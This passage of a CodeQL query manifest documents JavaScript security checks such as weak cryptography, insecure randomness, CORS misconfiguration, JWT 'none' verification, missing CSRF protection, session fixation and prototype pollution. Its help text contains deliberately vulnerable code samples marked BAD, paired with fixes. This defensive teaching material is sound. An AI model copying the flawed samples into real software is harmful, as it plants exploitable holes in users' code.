      security-severity: 7.5
      precision: low
      id: js/password-in-configuration-file
      tags: |-
        security
               external/cwe/cwe-256
               external/cwe/cwe-260
               external/cwe/cwe-313
               external/cwe/cwe-522
    queryHelp: |
      # Password in configuration file
      Storing a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.


      ## Recommendation
      Passwords stored in configuration files should always be encrypted.


      ## References
      * Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).
      * Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).
      * Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).
      * Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-326/InsufficientKeySize.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-326/InsufficientKeySize.bqrs
    metadata:
      name: Use of a weak cryptographic key
      description:
        Using a weak cryptographic key can allow an attacker to compromise
        security.
      kind: problem
      problem.severity: warning
      security-severity: 7.5
      precision: high
      id: js/insufficient-key-size
      tags: |-
        security
               external/cwe/cwe-326
    queryHelp: |
      # Use of a weak cryptographic key
      Modern encryption relies on it being computationally infeasible to break the cipher and decode a message without the key. As computational power increases, the ability to break ciphers grows and keys need to become larger.


      ## Recommendation
      An encryption key should be at least 2048-bit long when using RSA encryption, and 128-bit long when using symmetric encryption.


      ## References
      * Wikipedia: [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)).
      * Wikipedia: [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard).
      * NodeJS: [Crypto](https://nodejs.org/api/crypto.html).
      * NIST: [ Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).
      * Wikipedia: [Key size](https://en.wikipedia.org/wiki/Key_size)
      * Common Weakness Enumeration: [CWE-326](https://cwe.mitre.org/data/definitions/326.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-327/BadRandomness.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-327/BadRandomness.bqrs
    metadata:
      name: Creating biased random numbers from a cryptographically secure source
      description: |-
        Some mathematical operations on random numbers can cause bias in
                      the results and compromise security.
      kind: problem
      problem.severity: warning
      security-severity: 7.5
      precision: high
      id: js/biased-cryptographic-random
      tags: |-
        security
               external/cwe/cwe-327
    queryHelp: |
      # Creating biased random numbers from a cryptographically secure source
      Generating secure random numbers can be an important part of creating a secure software system. This can be done using APIs that create cryptographically secure random numbers.

      However, using some mathematical operations on these cryptographically secure random numbers can create biased results, where some outcomes are more likely than others. Such biased results can make it easier for an attacker to guess the random numbers, and thereby break the security of the software system.


      ## Recommendation
      Be very careful not to introduce bias when performing mathematical operations on cryptographically secure random numbers.

      If possible, avoid performing mathematical operations on cryptographically secure random numbers at all, and use a preexisting library instead.


      ## Example
      The example below uses the modulo operator to create an array of 10 random digits using random bytes as the source for randomness.


      ```javascript
      const crypto = require('crypto');

      const digits = [];
      for (let i = 0; i < 10; i++) {
          digits.push(crypto.randomBytes(1)[0] % 10); // NOT OK
      }
      ```
      The random byte is a uniformly random value between 0 and 255, and thus the result from using the modulo operator is slightly more likely to be between 0 and 5 than between 6 and 9.

      The issue has been fixed in the code below by using a library that correctly generates cryptographically secure random values.


      ```javascript
      const cryptoRandomString = require('crypto-random-string');

      const digits = cryptoRandomString({length: 10, type: 'numeric'});
      ```
      Alternatively, the issue can be fixed by fixing the math in the original code. In the code below the random byte is discarded if the value is greater than or equal to 250. Thus the modulo operator is used on a uniformly random number between 0 and 249, which results in a uniformly random digit between 0 and 9.


      ```javascript
      const crypto = require('crypto');

      const digits = [];
      while (digits.length < 10) {
          const byte = crypto.randomBytes(1)[0];
          if (byte >= 250) {
              continue;
          }
          digits.push(byte % 10); // OK
      }
      ```

      ## References
      * Stack Overflow: [Understanding “randomness”](https://stackoverflow.com/questions/3956478/understanding-randomness).
      * OWASP: [Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness).
      * OWASP: [Rule - Use strong approved cryptographic algorithms](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-strong-approved-authenticated-encryption).
      * Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-327/BrokenCryptoAlgorithm.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-327/BrokenCryptoAlgorithm.bqrs
    metadata:
      name: Use of a broken or weak cryptographic algorithm
      description: Using broken or weak cryptographic algorithms can compromise security.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      precision: high
      id: js/weak-cryptographic-algorithm
      tags: |-
        security
               external/cwe/cwe-327
               external/cwe/cwe-328
    queryHelp: |
      # Use of a broken or weak cryptographic algorithm
      Using broken or weak cryptographic algorithms can leave data vulnerable to being decrypted or forged by an attacker.

      Many cryptographic algorithms provided by cryptography libraries are known to be weak, or flawed. Using such an algorithm means that encrypted or hashed data is less secure than it appears to be.


      ## Recommendation
      Ensure that you use a strong, modern cryptographic algorithm. Use at least AES-128 or RSA-2048 for encryption, and SHA-2 or SHA-3 for secure hashing.


      ## Example
      The following code shows an example of using the builtin cryptographic library of NodeJS to encrypt some secret data. When creating a `Cipher` instance to encrypt the secret data with, you must specify the encryption algorithm to use. The first example uses DES, which is an older algorithm that is now considered weak. The second example uses AES, which is a strong modern algorithm.


      ```javascript
      const crypto = require('crypto');

      var secretText = obj.getSecretText();

      const desCipher = crypto.createCipher('des', key);
      let desEncrypted = desCipher.write(secretText, 'utf8', 'hex'); // BAD: weak encryption

      const aesCipher = crypto.createCipher('aes-128', key);
      let aesEncrypted = aesCipher.update(secretText, 'utf8', 'hex'); // GOOD: strong encryption

      ```

      ## References
      * NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).
      * NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).
      * OWASP: [Rule - Use strong approved cryptographic algorithms](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-strong-approved-authenticated-encryption).
      * Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).
      * Common Weakness Enumeration: [CWE-328](https://cwe.mitre.org/data/definitions/328.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-338/InsecureRandomness.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-338/InsecureRandomness.bqrs
    metadata:
      name: Insecure randomness
      description: |-
        Using a cryptographically weak pseudo-random number generator to generate a
                      security-sensitive value may allow an attacker to predict what value will
                      be generated.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.8
      precision: high
      id: js/insecure-randomness
      tags: |-
        security
               external/cwe/cwe-338
    queryHelp:
      "# Insecure randomness\nUsing a cryptographically weak pseudo-random\
      \ number generator to generate a security-sensitive value, such as a password,\
      \ makes it easier for an attacker to predict the value.\n\nPseudo-random number\
      \ generators generate a sequence of numbers that only approximates the properties\
      \ of random numbers. The sequence is not truly random because it is completely\
      \ determined by a relatively small set of initial values, the seed. If the random\
      \ number generator is cryptographically weak, then this sequence may be easily\
      \ predictable through outside observations.\n\n\n## Recommendation\nUse a cryptographically\
      \ secure pseudo-random number generator if the output is to be used in a security-sensitive\
      \ context. As a rule of thumb, a value should be considered \"security-sensitive\"\
      \ if predicting it would allow the attacker to perform an action that they would\
      \ otherwise be unable to perform. For example, if an attacker could predict the\
      \ random password generated for a new user, they would be able to log in as that\
      \ new user.\n\nFor JavaScript on the NodeJS platform, `crypto.getRandomBytes`\
      \ provides a cryptographically secure pseudo-random byte generator. Note that\
      \ the conversion from bytes to numbers can introduce bias that breaks the security.\n\
      \nFor JavaScript in the browser, `crypto.getRandomValues` provides a cryptographically\
      \ secure pseudo-random number generator.\n\n\n## Example\nThe following examples\
      \ show different ways of generating a password.\n\nIn the first case, we generate\
      \ a fresh password by appending a random integer to the end of a static string.\
      \ The random number generator used (`Math.random`) is not cryptographically secure,\
      \ so it may be possible for an attacker to predict the generated password.\n\n\
      \n```javascript\nfunction insecurePassword() {\n    // BAD: the random suffix\
      \ is not cryptographically secure\n    var suffix = Math.random();\n    var password\
      \ = \"myPassword\" + suffix;\n    return password;\n}\n\n```\nIn the second example,\
      \ a cryptographically secure random number generator is used for the same purpose.\
      \ In this case, it is much harder to predict the generated integers.\n\n\n```javascript\n\
      function securePassword() {\n    // GOOD: the random suffix is cryptographically\
      \ secure\n    var suffix = window.crypto.getRandomValues(new Uint32Array(1))[0];\n\
      \    var password = \"myPassword\" + suffix;\n    \n    // GOOD: if a random value\
      \ between 0 and 1 is desired\n    var secret = window.crypto.getRandomValues(new\
      \ Uint32Array(1))[0] * Math.pow(2,-32);\n}\n\n```\n\n## References\n* Wikipedia:\
      \ [Pseudo-random number generator](http://en.wikipedia.org/wiki/Pseudorandom_number_generator).\n\
      * Mozilla Developer Network: [Crypto: getRandomValues()](https://developer.mozilla.org/en-US/docs/Web/API/Crypto/getRandomValues).\n\
      * NodeJS: [crypto.randomBytes](https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback)\n\
      * Common Weakness Enumeration: [CWE-338](https://cwe.mitre.org/data/definitions/338.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-346/CorsMisconfigurationForCredentials.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-346/CorsMisconfigurationForCredentials.bqrs
    metadata:
      name: CORS misconfiguration for credentials transfer
      description:
        Misconfiguration of CORS HTTP headers allows for leaks of secret
        credentials.
      kind: path-problem
      problem.severity: error
      security-severity: 7.5
      precision: high
      id: js/cors-misconfiguration-for-credentials
      tags: |-
        security
               external/cwe/cwe-346
               external/cwe/cwe-639
               external/cwe/cwe-942
    queryHelp: |
      # CORS misconfiguration for credentials transfer
      A server can send the `"Access-Control-Allow-Credentials"` CORS header to control when a browser may send user credentials in Cross-Origin HTTP requests.

      When the `Access-Control-Allow-Credentials` header is `"true"`, the `Access-Control-Allow-Origin` header must have a value different from `"*"` in order to make browsers accept the header. Therefore, to allow multiple origins for Cross-Origin requests with credentials, the server must dynamically compute the value of the `"Access-Control-Allow-Origin"` header. Computing this header value from information in the request to the server can therefore potentially allow an attacker to control the origins that the browser sends credentials to.


      ## Recommendation
      When the `Access-Control-Allow-Credentials` header value is `"true"`, a dynamic computation of the `Access-Control-Allow-Origin` header must involve sanitization if it relies on user-controlled input.

      Since the `"null"` origin is easy to obtain for an attacker, it is never safe to use `"null"` as the value of the `Access-Control-Allow-Origin` header when the `Access-Control-Allow-Credentials` header value is `"true"`.


      ## Example
      In the example below, the server allows the browser to send user credentials in a Cross-Origin request. The request header `origins` controls the allowed origins for such a Cross-Origin request.


      ```javascript
      var https = require('https'),
          url = require('url');

      var server = https.createServer(function(){});

      server.on('request', function(req, res) {
          let origin = url.parse(req.url, true).query.origin;
           // BAD: attacker can choose the value of origin
          res.setHeader("Access-Control-Allow-Origin", origin);
          res.setHeader("Access-Control-Allow-Credentials", true);

          // ...
      });

      ```
      This is not secure, since an attacker can choose the value of the `origin` request header to make the browser send credentials to their own server. The use of a whitelist containing allowed origins for the Cross-Origin request fixes the issue:


      ```javascript
      var https = require('https'),
          url = require('url');

      var server = https.createServer(function(){});

      server.on('request', function(req, res) {
          let origin = url.parse(req.url, true).query.origin,
              whitelist = {
                  "https://example.com": true,
                  "https://subdomain.example.com": true,
                  "https://example.com:1337": true
              };

          if (origin in whitelist) {
              // GOOD: the origin is in the whitelist
              res.setHeader("Access-Control-Allow-Origin", origin);
              res.setHeader("Access-Control-Allow-Credentials", true);
          }

          // ...
      });

      ```

      ## References
      * Mozilla Developer Network: [CORS, Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).
      * Mozilla Developer Network: [CORS, Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials).
      * PortSwigger: [Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)
      * W3C: [CORS for developers, Advice for Resource Owners](https://w3c.github.io/webappsec-cors-for-developers/#resources)
      * Common Weakness Enumeration: [CWE-346](https://cwe.mitre.org/data/definitions/346.html).
      * Common Weakness Enumeration: [CWE-639](https://cwe.mitre.org/data/definitions/639.html).
      * Common Weakness Enumeration: [CWE-942](https://cwe.mitre.org/data/definitions/942.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-347/MissingJWTKeyVerification.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-347/MissingJWTKeyVerification.bqrs
    metadata:
      name: JWT missing secret or public key verification
      description:
        The application does not verify the JWT payload with a cryptographic
        secret or public key.
      kind: problem
      problem.severity: warning
      security-severity: 7.0
      precision: high
      id: js/jwt-missing-verification
      tags: |-
        security
               external/cwe/cwe-347
    queryHelp:
      "# JWT missing secret or public key verification\nApplications decoding\
      \ JSON Web Tokens (JWT) may be misconfigured due to the `None` algorithm.\n\n\
      The `None` algorithm is selected by calling the `verify()` function with a falsy\
      \ value instead of a cryptographic secret or key. The `None` algorithm disables\
      \ the integrity enforcement of a JWT payload and may allow a malicious actor to\
      \ make unintended changes to a JWT payload leading to critical security issues\
      \ like privilege escalation.\n\n\n## Recommendation\nCalls to `verify()` functions\
      \ should use a cryptographic secret or key to decode JWT payloads.\n\n\n## Example\n\
      In the example below, `false` is used to disable the integrity enforcement of\
      \ a JWT payload. This may allow a malicious actor to make changes to a JWT payload.\n\
      \n\n```javascript\nconst jwt = require(\"jsonwebtoken\");\n\nconst secret = \"\
      my-secret-key\";\n\nvar token = jwt.sign({ foo: 'bar' }, secret, { algorithm:\
      \ \"none\" })\njwt.verify(token, false, { algorithms: [\"HS256\", \"none\"] })\n\
      ```\nThe following code fixes the problem by using a cryptographic secret or key\
      \ to decode JWT payloads.\n\n\n```javascript\n\nconst jwt = require(\"jsonwebtoken\"\
      );\n\nconst secret = \"my-secret-key\";\n\nvar token = jwt.sign({ foo: 'bar' },\
      \ secret, { algorithm: \"HS256\" }) \njwt.verify(token, secret, { algorithms:\
      \ [\"HS256\", \"none\"] })\n```\n\n## References\n* Auth0 Blog: [Meet the \"None\"\
      \ Algorithm](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/#Meet-the--None--Algorithm).\n\
      * Common Weakness Enumeration: [CWE-347](https://cwe.mitre.org/data/definitions/347.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-352/MissingCsrfMiddleware.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-352/MissingCsrfMiddleware.bqrs
    metadata:
      name: Missing CSRF middleware
      description: |-
        Using cookies without CSRF protection may allow malicious websites to
                      submit requests on behalf of the user.
      kind: problem
      problem.severity: error
      security-severity: 8.8
      precision: high
      id: js/missing-token-validation
      tags: |-
        security
               external/cwe/cwe-352
    queryHelp: |
      # Missing CSRF middleware
      Websites that rely on cookie-based authentication may be vulnerable to cross-site request forgery (CSRF). Specifically, a state-changing request should include a secret token so the request can't be forged by an attacker. Otherwise, unwanted requests can be submitted on behalf of a user who visits a malicious website.

      This is typically mitigated by embedding a session-specific secret token in each request. This token is then checked as an additional authentication measure. A malicious website should have no way of guessing the correct token to embed in the request.


      ## Recommendation
      Use a middleware package such as `lusca.csrf` to protect against CSRF attacks.


      ## Example
      In the example below, the server authenticates users before performing the `changeEmail` POST action:


      ```javascript
      const app = require("express")(),
        cookieParser = require("cookie-parser"),
        bodyParser = require("body-parser"),
        session = require("express-session");

      app.use(cookieParser());
      app.use(bodyParser.urlencoded({ extended: false }));
      app.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));

      // ...

      app.post("/changeEmail", function(req, res) {
        const userId = req.session.id;
        const email = req.body["email"];
        // ... update email associated with userId
      });

      ```
      This is not secure. An attacker can submit a POST `changeEmail` request on behalf of a user who visited a malicious website. Since authentication happens without any action from the user, the `changeEmail` action would be executed, despite not being initiated by the user.

      This vulnerability can be mitigated by installing a CSRF protecting middleware handler:


      ```javascript
      const app = require("express")(),
        cookieParser = require("cookie-parser"),
        bodyParser = require("body-parser"),
        session = require("express-session"),
        csrf = require('lusca').csrf;

      app.use(cookieParser());
      app.use(bodyParser.urlencoded({ extended: false }));
      app.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));
      app.use(csrf());

      // ...

      app.post("/changeEmail", function(req, res) {
        const userId = req.session.id;
        const email = req.body["email"];
        // ... update email associated with userId
      });

      ```

      ## References
      * OWASP: [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
      * NPM: [lusca](https://www.npmjs.com/package/lusca)
      * Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-367/FileSystemRace.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-367/FileSystemRace.bqrs
    metadata:
      name: Potential file system race condition
      description: |-
        Separately checking the state of a file before operating
                      on it may allow an attacker to modify the file between
                      the two operations.
      kind: problem
      problem.severity: warning
      security-severity: 7.7
      precision: medium
      id: js/file-system-race
      tags: |-
        security
               external/cwe/cwe-367
    queryHelp: |
      # Potential file system race condition
      Often it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.

      However, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.


      ## Recommendation
      Use file descriptors instead of file names whenever possible.


      ## Example
      The following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.


      ```javascript
      const fs = require("fs");
      const os = require("os");
      const path = require("path");

      const filePath = path.join(os.tmpdir(), "my-temp-file.txt");

      if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, "Hello", { mode: 0o600 });
      }

      ```
      However, in a multi-user environment the file might be created by another user between the existence check and the write.

      This can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.


      ```javascript
      const fs = require("fs");
      const os = require("os");
      const path = require("path");

      const filePath = path.join(os.tmpdir(), "my-temp-file.txt");

      try {
        const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);

        fs.writeFileSync(fd, "Hello");
      } catch (e) {
        // file existed
      }

      ```

      ## References
      * Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).
      * The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).
      * NodeJS: [The FS module](https://nodejs.org/api/fs.html).
      * Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-377/InsecureTemporaryFile.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-377/InsecureTemporaryFile.bqrs
    metadata:
      name: Insecure temporary file
      description: |-
        Creating a temporary file that is accessible by other users can
         lead to information disclosure and sometimes remote code execution.
      kind: path-problem
      id: js/insecure-temporary-file
      problem.severity: warning
      security-severity: 7.0
      precision: medium
      tags: |-
        external/cwe/cwe-377
               external/cwe/cwe-378
               security
    queryHelp: |
      # Insecure temporary file
      Temporary files created in the operating system's temporary directory are by default accessible to other users. In some cases, this can lead to information exposure, or in the worst case, to remote code execution.


      ## Recommendation
      Use a well-tested library like [tmp](https://www.npmjs.com/package/tmp) for creating temporary files. These libraries ensure both that the file is inaccessible to other users and that the file does not already exist.


      ## Example
      The following example creates a temporary file in the operating system's temporary directory.


      ```javascript
      const fs = require('fs');
      const os = require('os');
      const path = require('path');

      const file = path.join(os.tmpdir(), "test-" + (new Date()).getTime() + ".txt");
      fs.writeFileSync(file, "content");
      ```
      The file created above is accessible to other users, and there is no guarantee that the file does not already exist.

      The below example uses the [tmp](https://www.npmjs.com/package/tmp) library to securely create a temporary file.


      ```javascript
      const fs = require('fs');
      const tmp = require('tmp');

      const file = tmp.fileSync().name;
      fs.writeFileSync(file, "content");
      ```

      ## References
      * Mitre.org: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).
      * NPM: [tmp](https://www.npmjs.com/package/tmp).
      * Common Weakness Enumeration: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).
      * Common Weakness Enumeration: [CWE-378](https://cwe.mitre.org/data/definitions/378.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-384/SessionFixation.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-384/SessionFixation.bqrs
    metadata:
      name: Failure to abandon session
      description: |-
        Reusing an existing session as a different user could allow
                      an attacker to access someone else's account by using
                      their session.
      kind: problem
      problem.severity: warning
      security-severity: 5
      precision: medium
      id: js/session-fixation
      tags: |-
        security
               external/cwe/cwe-384
    queryHelp: |
      # Failure to abandon session
      Reusing a session could allow an attacker to gain unauthorized access to another account. Always ensure that, when a user logs in or out, the current session is abandoned so that a new session may be started.


      ## Recommendation
      Always use `req.session.regenerate(...);` to start a new session when a user logs in or out.


      ## Example
      The following example shows the previous session being used after authentication. This would allow a previous user to use the new user's account.


      ```javascript
      const express = require('express');
      const session = require('express-session');
      var bodyParser = require('body-parser')
      const app = express();
      app.use(bodyParser.urlencoded({ extended: false }))
      app.use(session({
          secret: 'keyboard cat'
      }));

      app.post('/login', function (req, res) {
          // Check that username password matches
          if (req.body.username === 'admin' && req.body.password === 'admin') {
              req.session.authenticated = true;
              res.redirect('/');
          } else {
              res.redirect('/login');
          }
      });
      ```
      This code example solves the problem by not reusing the session, and instead calling `req.session.regenerate()` to ensure that the session is not reused.


      ```javascript
      const express = require('express');
      const session = require('express-session');
      var bodyParser = require('body-parser')
      const app = express();
      app.use(bodyParser.urlencoded({ extended: false }))
      app.use(session({
          secret: 'keyboard cat'
      }));

      app.post('/login', function (req, res) {
          // Check that username password matches
          if (req.body.username === 'admin' && req.body.password === 'admin') {
              req.session.regenerate(function (err) {
                  if (err) {
                      res.send('Error');
                  } else {
                      req.session.authenticated = true;
                      res.redirect('/');
                  }
              });
          } else {
              res.redirect('/login');
          }
      });
      ```

      ## References
      * OWASP: [Session fixation](https://www.owasp.org/index.php/Session_fixation)
      * Stack Overflow: [Creating a new session after authentication with Passport](https://stackoverflow.com/questions/22209354/creating-a-new-session-after-authentication-with-passport/30468384#30468384)
      * jscrambler.com: [Best practices for secure session management in Node](https://blog.jscrambler.com/best-practices-for-secure-session-management-in-node)
      * Common Weakness Enumeration: [CWE-384](https://cwe.mitre.org/data/definitions/384.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-400/DeepObjectResourceExhaustion.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-400/DeepObjectResourceExhaustion.bqrs
    metadata:
      name: Resources exhaustion from deep object traversal
      description:
        Processing user-controlled object hierarchies inefficiently can lead
        to denial of service.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      precision: high
      id: js/resource-exhaustion-from-deep-object-traversal
      tags: |-
        security
               external/cwe/cwe-400
    queryHelp:
      "# Resources exhaustion from deep object traversal\nProcessing user-controlled\
      \ data with a method that allocates excessive amounts of memory can lead to denial\
      \ of service.\n\nIf the JSON schema validation library `ajv` is configured with\
      \ `allErrors: true` there is no limit to how many error objects will be allocated.\
      \ An attacker can exploit this by sending an object that deliberately contains\
      \ a huge number of errors, and in some cases, with longer and longer error messages.\
      \ This can cause the service to become unresponsive due to the slow error-checking\
      \ process.\n\n\n## Recommendation\nDo not use `allErrors: true` in production.\n\
      \n\n## Example\nIn the example below, the user-submitted object `req.body` is\
      \ validated using `ajv` and `allErrors: true`:\n\n\n```javascript\nimport express\
      \ from 'express';\nimport Ajv from 'ajv';\n\nlet ajv = new Ajv({ allErrors: true\
      \ });\najv.addSchema(require('./input-schema'), 'input');\n\nvar app = express();\n\
      app.get('/user/:id', function(req, res) {\n\tif (!ajv.validate('input', req.body))\
      \ {\n\t\tres.end(ajv.errorsText());\n\t\treturn;\n\t}\n\t// ...\n});\n\n```\n\
      Although this ensures that `req.body` conforms to the schema, the validation itself\
      \ could be vulnerable to a denial-of-service attack. An attacker could send an\
      \ object containing so many errors that the server runs out of memory.\n\nA solution\
      \ is to not pass in `allErrors: true`, which means `ajv` will only report the\
      \ first error, not all of them:\n\n\n```javascript\nimport express from 'express';\n\
      import Ajv from 'ajv';\n\nlet ajv = new Ajv({ allErrors: process.env['REST_DEBUG']\
      \ });\najv.addSchema(require('./input-schema'), 'input');\n\nvar app = express();\n\
      app.get('/user/:id', function(req, res) {\n\tif (!ajv.validate('input', req.body))\
      \ {\n\t\tres.end(ajv.errorsText());\n\t\treturn;\n\t}\n\t// ...\n});\n\n```\n\n\
      ## References\n* Ajv documentation: [security considerations](https://github.com/ajv-validator/ajv/blob/master/docs/security.md#untrusted-schemas)\n\
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-400/RemotePropertyInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-400/RemotePropertyInjection.bqrs
    metadata:
      name: Remote property injection
      description: |-
        Allowing writes to arbitrary properties of an object may lead to
                      denial-of-service attacks.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      precision: medium
      id: js/remote-property-injection
      tags: |-
        security
               external/cwe/cwe-250
               external/cwe/cwe-400
    queryHelp:
      "# Remote property injection\nDynamically computing object property names\
      \ from untrusted input may have multiple undesired consequences. For example,\
      \ if the property access is used as part of a write, an attacker may overwrite\
      \ vital properties of objects, such as `__proto__`. This attack is known as *prototype\
      \ pollution attack* and may serve as a vehicle for denial-of-service attacks.\
      \ A similar attack vector, is to replace the `toString` property of an object\
      \ with a primitive. Whenever `toString` is then called on that object, either\
      \ explicitly or implicitly as part of a type coercion, an exception will be raised.\n\
      \nMoreover, if the name of an HTTP header is user-controlled, an attacker may\
      \ exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin`\
      \ or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in\
      \ which prototype pollution vulnerabilities arise is when JavaScript objects are\
      \ used for implementing map data structures. This case should be avoided whenever\
      \ possible by using the ECMAScript 2015 `Map` instead. When this is not possible,\
      \ an alternative fix is to prepend untrusted input with a marker character such\
      \ as `$`, before using it in properties accesses. In this way, the attacker does\
      \ not have access to built-in properties which do not start with the chosen character.\n\
      \nWhen using user input as part of a header name, a sanitization step should be\
      \ performed on the input to ensure that the name does not clash with existing\
      \ header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example\
      \ below, the dynamically computed property `prop` is accessed on `myObj` using\
      \ a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\
      \nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res)\
      \ {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function()\
      \ {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure\
      \ since an attacker may exploit this code to overwrite the property `__proto__`\
      \ with an empty function. If this happens, the concatenation in the `console.log`\
      \ argument will fail with a confusing message such as \"Function.prototype.toString\
      \ is not generic\". If the application does not properly handle this error, this\
      \ scenario may result in a serious denial-of-service attack. The fix is to prepend\
      \ the user-controlled string with a marker character such as `$` which will prevent\
      \ arbitrary property names from being overwritten.\n\n\n```javascript\nvar express\
      \ = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id',\
      \ function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\
      \tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n\
      });\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287),\
      \ [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n\
      * Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n\
      * npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n\
      * Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n\
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-451/MissingXFrameOptions.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-451/MissingXFrameOptions.bqrs
    metadata:
      name: Missing X-Frame-Options HTTP header
      description: |-
        If the 'X-Frame-Options' setting is not provided, a malicious user may be able to
                      overlay their own UI on top of the site by using an iframe.
      kind: problem
      problem.severity: error
      security-severity: 7.5
      precision: low
      id: js/missing-x-frame-options
      tags: |-
        security
               external/cwe/cwe-451
               external/cwe/cwe-829
    queryHelp: |
      # Missing X-Frame-Options HTTP header
      Websites that do not specify the `X-Frame-Options` HTTP header may be vulnerable to UI redress attacks ("clickjacking"). In these attacks, the vulnerable site is loaded in a frame on an attacker-controlled site which uses opaque or transparent layers to trick the user into unintentionally clicking a button or link on the vulnerable site.


      ## Recommendation
